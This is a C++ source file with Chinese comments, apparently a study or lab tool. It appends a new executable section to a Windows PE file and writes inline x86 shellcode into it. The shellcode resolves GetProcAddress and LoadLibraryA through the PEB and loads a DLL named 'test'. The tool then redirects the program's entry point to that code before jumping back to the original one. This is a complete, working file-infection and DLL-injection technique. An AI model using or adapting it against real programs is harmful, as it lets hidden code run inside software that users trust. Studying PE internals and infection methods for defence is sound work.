#define _CRT_SECURE_NO_WARNINGS
//add_section.cpp
#include "windows.h"
#include "stdio.h"
//判断文件是否为合法PE文件
BOOL CheckPe(FILE* pFile)
{
	fseek(pFile, 0, SEEK_SET);
	BOOL	bFlags = FALSE;
	WORD	IsMZ;
	DWORD	IsPE, pNT;
	fread(&IsMZ, sizeof(WORD), 1, pFile);
	if (IsMZ == 0x5A4D)
	{
		fseek(pFile, 0x3c, SEEK_SET);
		fread(&pNT, sizeof(DWORD), 1, pFile);
		fseek(pFile, pNT, SEEK_SET);
		fread(&IsPE, sizeof(DWORD), 1, pFile);
		if (IsPE == 0X00004550)
			bFlags = TRUE;
		else
			bFlags = FALSE;
	}
	else
		bFlags = FALSE;
	fseek(pFile, 0, SEEK_SET);
	return bFlags;
}

//用来计算对齐数据后的大小
int alig(int size, unsigned int align)
{
	if (size%align != 0)
		return (size / align + 1)*align;
	else
		return size;
}


int main(int argc, char* argv[])
{
	if (argc != 2)
	{
		printf("\t\tusage:add_section filename\n");
		system("pause"); 
		exit(-1);
	}
	FILE* rwFile;
	if ((rwFile = fopen(argv[1], "rb")) == NULL)//打开文件失败则退出
	{
		printf("\t\tOpen file faild\n");
		system("pause"); 
		exit(-1);
	}

	if (!CheckPe(rwFile))
	{
		printf("\t\tinvalid pe......!\n");
		system("pause"); 
		exit(-1);
	}
	//备份原文件
	char szNewFile[10] = "_New.exe";
	if (!CopyFile(argv[1], szNewFile, 0)) //若备份文件出错则退出
	{
		printf("\t\tbak faild\n");
		system("pause");
		exit(-1);
	}
	IMAGE_NT_HEADERS NThea;
	fseek(rwFile, 0x3c, 0);
	DWORD pNT; //pNT中存放IMAGE_NT_HEADERS结构的地址
	fread(&pNT, sizeof(DWORD), 1, rwFile);
	fseek(rwFile, pNT, 0);
	fread(&NThea, sizeof(IMAGE_NT_HEADERS), 1, rwFile); //读取原文件的IMAGE_NT_HEADERS结构
														//保存原文件区块数量与OEP
	int nOldSectionNo = NThea.FileHeader.NumberOfSections;
	int OEP = NThea.OptionalHeader.AddressOfEntryPoint;
	//保存文件对齐值与区块对齐值
	int SECTION_ALIG = NThea.OptionalHeader.SectionAlignment;
	int FILE_ALIG = NThea.OptionalHeader.FileAlignment;

	//定义要添加的区块
	IMAGE_SECTION_HEADER	NewSection;
	//将该结构全部清零
	memset(&NewSection, 0, sizeof(IMAGE_SECTION_HEADER));
	//再定义一个区块，来存放原文件最后一个区块的信息
	IMAGE_SECTION_HEADER SEChea;
	//读原文件最后一个区块的信息
	fseek(rwFile, pNT + 248, 0);
	for (int i = 0; i<nOldSectionNo; i++)
		fread(&SEChea, sizeof(IMAGE_SECTION_HEADER), 1, rwFile);

	FILE *newfile = fopen(szNewFile, "rb+");
	if (newfile == NULL)
	{
		printf("\t\tOpen bak file faild\n");
		system("pause"); 
		exit(-1);
	}
	fseek(newfile, SEChea.PointerToRawData + SEChea.SizeOfRawData, SEEK_SET);
	goto shellend;
	__asm
	{
	shell:	PUSHAD
			MOV	EAX, DWORD PTR FS : [30H]; FS:[30H]指向PEB
			MOV	EAX, DWORD PTR[EAX + 0CH]; 获取PEB_LDR_DATA结构的指针
			MOV	EAX, DWORD PTR[EAX + 1CH]; 获取LDR_MODULE链表表首结点的inInitializeOrderModuleList成员的指针
			MOV	EAX, DWORD PTR[EAX]; LDR_MODULE链表第二个结点的inInitializeOrderModuleList成员的指针
			MOV	EAX, DWORD PTR[EAX + 08H]; inInitializeOrderModuleList偏移8h便得到Kernel32.dll的模块基址
			MOV	EBP, EAX;	将Kernel32.dll模块基址地址放至kernel中
			MOV	EAX, DWORD PTR[EAX + 3CH]; 指向IMAGE_NT_HEADERS
			MOV	EAX, DWORD PTR[EBP + EAX + 120]; 指向导出表
			MOV	ECX, [EBP + EAX + 24]; 取导出表中导出函数名字的数目
			MOV	EBX, [EBP + EAX + 32]; 取导出表中名字表的地址
			ADD	EBX, EBP
			PUSH WORD  PTR 0X00; 构造GetProcAddress字符串
			PUSH DWORD PTR 0X73736572
			PUSH DWORD PTR 0X64644163
			PUSH DWORD PTR 0X6F725074
			PUSH WORD PTR 0X6547
			MOV  EDX, ESP
			PUSH ECX


			F1 :
			MOV	EDI, EDX
				POP	ECX
				DEC	ECX
				TEST	ECX, ECX
				JZ	EXIT
				MOV	ESI, [EBX + ECX * 4]
				ADD	ESI, EBP
				PUSH	ECX
				MOV	ECX, 15
				REPZ	CMPSB
				TEST	ECX, ECX
				JNZ	F1

				POP	ECX
				MOV	ESI, [EBP + EAX + 36]; 取得导出表中序号表的地址
				ADD	ESI, EBP
				MOVZX	ESI, WORD PTR[ESI + ECX * 2]; 取得进入函数地址表的序号
				MOV	EDI, [EBP + EAX + 28]; 取得函数地址表的地址
				ADD	EDI, EBP
				MOV	EDI, [EDI + ESI * 4]; 取得GetProcAddress函数的地址
				ADD	EDI, EBP

				PUSH WORD PTR 0X00; 构造LoadLibraryA字符串
				PUSH DWORD PTR 0X41797261
				PUSH DWORD PTR 0X7262694C
				PUSH DWORD PTR 0X64616F4C
				PUSH ESP
				PUSH	EBP
				CALL	EDI; 调用GetProcAddress取得LoadLibraryA函数的地址
				PUSH	WORD PTR 0X00; 构造test符串，测试新增节后的EXE是否能正常加载test.dll
				PUSH	DWORD PTR 0X74736574
				PUSH	ESP
				CALL	EAX
				EXIT : ADD ESP, 36; 平衡堆栈
				POPAD
	}
shellend:
	char *pShell;
	int nShellLen;
	__asm
	{
		LEA EAX, shell
		MOV pShell, EAX;
		LEA EBX, shellend
			SUB EBX, EAX
			MOV nShellLen, EBX
	}

	//写入SHELLCODE,
	for (int i = 0; i<nShellLen; i++)
		fputc(pShell[i], newfile);
	//SHELLCODE之后是跳转到原OEP的指令
	NewSection.VirtualAddress = SEChea.VirtualAddress + alig(SEChea.Misc.VirtualSize, SECTION_ALIG);
	BYTE jmp = 0xE9;
	OEP = OEP - (NewSection.VirtualAddress + nShellLen) - 5;
	fwrite(&jmp, sizeof(jmp), 1, newfile);
	fwrite(&OEP, sizeof(OEP), 1, newfile);
	//将最后增加的数据用0填充至按文件中对齐的大小
	for (int i = 0; i < alig(nShellLen, FILE_ALIG) - nShellLen - 5; i++) {
		fputc('\0', newfile);
	}
	//新区块中的数据
	strcpy((char*)NewSection.Name, ".llydd");
	NewSection.PointerToRawData = SEChea.PointerToRawData + SEChea.SizeOfRawData;
	NewSection.Misc.VirtualSize = nShellLen;
	NewSection.SizeOfRawData = alig(nShellLen, FILE_ALIG);
	NewSection.Characteristics = 0xE0000020;//新区块可读可写可执行
	fseek(newfile, pNT + 248 + sizeof(IMAGE_SECTION_HEADER)*nOldSectionNo, 0);

	//写入新的块表
	fwrite(&NewSection, sizeof(IMAGE_SECTION_HEADER), 1, newfile);

	int nNewImageSize = NThea.OptionalHeader.SizeOfImage + alig(nShellLen, SECTION_ALIG);
	int nNewSizeofCode = NThea.OptionalHeader.SizeOfCode + alig(nShellLen, FILE_ALIG);
	fseek(newfile, pNT, 0);
	NThea.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress = 0;
	NThea.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].Size = 0;
	NThea.OptionalHeader.SizeOfCode = nNewSizeofCode;
	NThea.OptionalHeader.SizeOfImage = nNewImageSize;
	NThea.FileHeader.NumberOfSections = nOldSectionNo + 1;
	NThea.OptionalHeader.AddressOfEntryPoint = NewSection.VirtualAddress;
	//写入更新后的PE头结构
	fwrite(&NThea, sizeof(IMAGE_NT_HEADERS), 1, newfile);
	printf("\t\tok.........!\n");

	fclose(newfile);
	fclose(rwFile);

	system("pause");
	return 1;

}